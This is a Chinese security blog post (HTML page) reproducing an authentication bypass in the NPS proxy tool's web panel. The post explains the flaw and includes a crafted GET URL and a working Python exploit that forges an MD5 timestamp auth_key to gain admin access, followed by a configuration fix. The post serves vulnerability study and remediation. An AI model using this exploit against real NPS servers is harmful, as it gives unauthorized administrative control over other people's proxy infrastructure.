@@ -1,0 +1,380 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>NPS代理工具未授权漏洞 | 小C♥天天</title>
+        <meta name="author" content="小C&天天">
+        <meta name="description" content="^v^">
+        <meta name="keywords" content="">
+        <link rel="icon" href="/images/icon.jpg">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        <link rel="stylesheet" href="/css/main.css">
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+        <link rel="stylesheet" href="/css/style.css">
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <form class="search">
+            <input type="text" placeholder="需要搜索什么？">
+            <button type="submit"></button>
+        </form>
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+
+<div id="home-posts-wrap" class=>
+<div class="article">
+    <div>
+        <h1>NPS代理工具未授权漏洞 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/3/14
+        </span>
+        
+        <span class="category">
+            <a href="/categories/漏洞复现">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                漏洞复现
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/代理" style="color: #ffa2c4">
+                    代理
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/反制" style="color: #03a9f4">
+                    反制
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/未授权" style="color: #03a9f4">
+                    未授权
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="壹-漏洞概念"><a href="#壹-漏洞概念" class="headerlink" title="壹 漏洞概念"></a>壹 漏洞概念</h1><p>之前一直用<code>NPS</code>做代理，后来和朋友聊天的时候，说该工具有<code>0day</code>未授权漏洞，然后白嫖了一下思路，然后自己进行简单分析后利用成功！<code>NPS</code>是一款轻量级、高性能、功能强大的内网穿透代理服务器。对于<code>NPS</code>近期爆出来了一个未授权的漏洞。</p>
+<span id="more"></span>
+
+<h1 id="贰-漏洞原理及利用条件"><a href="#贰-漏洞原理及利用条件" class="headerlink" title="贰 漏洞原理及利用条件"></a>贰 漏洞原理及利用条件</h1><p><code>nps</code>的<code>web</code>端使用<code>beego</code>框架，重写了<code>Prepare</code>函数，在该函数中进行了权限控制，漏洞文件在<code>web/controllers/base.go</code>：<br><img src="/images/%E5%A4%8D%E7%8E%B0/51b981d8f0a3f19f829de5352d5a40a1.png" alt="51b981d8f0a3f19f829de5352d5a40a1.png"><br>通过这个判断我们可以看到需要两个参数<code>auth_key</code>和<code>timestamp</code>，当这两个参数不符合<code>if</code>语句的第一个条件时，会进入<code>else</code>语句，设置<code>session</code>中的<code>isadmin</code>为<code>true</code>，而由于在<code>nps</code>的配置文件中，<code>auth_key</code>默认是被注释的：<br><img src="/images/%E5%A4%8D%E7%8E%B0/1d4c01b7f3c0cdcf3afc9c1ea99ec23e.png" alt="1d4c01b7f3c0cdcf3afc9c1ea99ec23e.png"><br>这就导致代码中<code>beego.AppConfig.String(&quot;auth_key&quot;)</code>获取的结果就是空值，这样<code>crypt.Md5(configKey+strconv.Itoa(timestamp)</code>就相当于只需要把<code>timestamp</code>进行<code>md5</code>即可：<br><img src="/images/%E5%A4%8D%E7%8E%B0/9aee275736e57fac4e6eaa96fd64d40e.png" alt="9aee275736e57fac4e6eaa96fd64d40e.png"><br>所以漏洞的原因就是由于没有设置<code>auth_key</code>的值导致的！</p>
+<h1 id="叁-适用版本"><a href="#叁-适用版本" class="headerlink" title="叁 适用版本"></a>叁 适用版本</h1><p>目前知道的有漏洞的版本是<code>v0.26.10</code>之前的（包括该版本）！</p>
+<h1 id="肆-复现环境说明"><a href="#肆-复现环境说明" class="headerlink" title="肆 复现环境说明"></a>肆 复现环境说明</h1><p>使用的是<code>v0.26.10</code>版本：<br><img src="/images/%E5%A4%8D%E7%8E%B0/28d0dcda23da97a795411a3011ea3441.png" alt="28d0dcda23da97a795411a3011ea3441.png"></p>
+<h1 id="伍-复现"><a href="#伍-复现" class="headerlink" title="伍 复现"></a>伍 复现</h1><p>根据原理我们构造<code>EXP</code>（下面有脚本），这里我们使用<code>Get</code>请求：</p>
+<pre><code class="bash">http://192.168.239.139:8080/Index/Index/?auth_key=6a9000fce76de17a23d817c5f906e3df&amp;timestamp=1663751157
+</code></pre>
+<p><img src="/images/%E5%A4%8D%E7%8E%B0/93052d8de6e7dd3d749b10dd1a3512b6.png" alt="93052d8de6e7dd3d749b10dd1a3512b6.png"></p>
+<p>但是我们通过<code>web/controllers/base.go</code>代码可以看到时效只有<code>20s</code>，而且如果使用<code>Get</code>请求的话，只能使用一次，所以建议使用<code>Post</code>请求，而且还需要不断的发包请求，维持权限。</p>
+<h1 id="陆-利用Poc-Exp以及工具"><a href="#陆-利用Poc-Exp以及工具" class="headerlink" title="陆 利用Poc|Exp以及工具"></a>陆 利用Poc|Exp以及工具</h1><pre><code class="python">import time
+import hashlib
+import requests
+
+# 构造URL
+IP = &quot;192.168.239.139:8080&quot;
+URL = &quot;http://&#123;&#125;/Index/Index&quot;.format(IP)
+now = time.time()
+m = hashlib.md5()
+m.update(str(int(now)).encode(&quot;utf8&quot;))
+auth_key = m.hexdigest()
+
+# 代理
+# Proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;#格式是&quot;协议&quot;:&quot;代理地址:端口&quot;
+
+# 请求头
+Headers = &#123;
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0&quot;,
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+&#125;
+
+# 请求体
+Data = &#123;
+    &quot;auth_key&quot;:auth_key,
+    &quot;timestamp&quot;:int(now),
+&#125;
+
+# 获取请求
+try:
+    requ = requests.post(URL,headers = Headers,data = Data)
+    if &quot;/index/hostlist&quot; in requ.text:
+        print(&quot;\033[32;1m[+]\033[0m NPS存在未授权漏洞，URL为：&#123;&#125;&quot;.format(URL+&quot;/?auth_key=&#123;&#125;&amp;timestamp=&#123;&#125;&quot;.format(auth_key,int(now))))
+    else:
+        print(&quot;\033[31;1m[-]\033[0m NPS不存在未授权漏洞！&quot;)
+except BaseException as err:
+    print(&quot;\033[31;1m[-]\033[0m NPS不存在未授权漏洞！&quot;,err)
+</code></pre>
+<h1 id="柒-危害"><a href="#柒-危害" class="headerlink" title="柒 危害"></a>柒 危害</h1><p>反制<code>NPS</code>。</p>
+<h1 id="捌-修复建议"><a href="#捌-修复建议" class="headerlink" title="捌 修复建议"></a>捌 修复建议</h1><p>只需要在配置文件里去掉<code>auth_key</code>的注释，同时注释掉<code>auth_crypt_key</code>：<br><img src="/images/%E5%A4%8D%E7%8E%B0/4cdf01cbac067c1f55f994352e7157c6.png" alt="4cdf01cbac067c1f55f994352e7157c6.png"></p>
+<h1 id="玖-参考"><a href="#玖-参考" class="headerlink" title="玖 参考"></a>玖 参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzNzk1NTU0Mw==&mid=2247485761&idx=1&sn=f0490e3996b57fc7661c695c0c4d0769&chksm=e8c1f9f9dfb670ef359c232e47cd1db085b7761382e8c3561237d49dfa86f9448c46af17f285&scene=27">hvv反制红队第一章之nps代理工具0day漏洞分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">NPS官网</a></li>
+</ul>
+
+    </div>
+    
+</div>
+
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg " alt="avatar">
+        </div>
+        <div class="name">
+            小C&天天
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                修学储能 先博后渊
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">
+                    kyrieee个人博客
+                </a>
+            </div>
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">
+                    tonyd0g
+                </a>
+            </div>
+            
+        </div>
+    </div>
+    <!-- 目录 -->
+    
+        <div class="card-style" style="width: 300px">
+            <div id="toc" class="toc-article">
+                <strong class="toc-title">文章目录</strong>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5"><span class="toc-text">壹 漏洞概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">贰 漏洞原理及利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"><span class="toc-text">叁 适用版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%82%86-%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="toc-text">肆 复现环境说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%8D-%E5%A4%8D%E7%8E%B0"><span class="toc-text">伍 复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%86-%E5%88%A9%E7%94%A8Poc-Exp%E4%BB%A5%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="toc-text">陆 利用Poc|Exp以及工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%92-%E5%8D%B1%E5%AE%B3"><span class="toc-text">柒 危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8D%8C-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">捌 修复建议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%96-%E5%8F%82%E8%80%83"><span class="toc-text">玖 参考</span></a></li></ol>
+            </div>    
+        </div>
+        
+    </div>
+</div>
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            @小C&天天
+        </div>
+        <div>
+            备案号：小C&天天の窝
+        </div>
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+        <!-- 3D模型 -->
+        <div id="L2dCanvas" style="position: relative;"></div>
+        <script src="/js/live2d.min.js"></script>
+        <script src="/css/live2d.css"></script>
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "zhala_2",
+                mobile: true,
+            });
+        </script>
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/background.js"></script>
+    </body>
+</html>
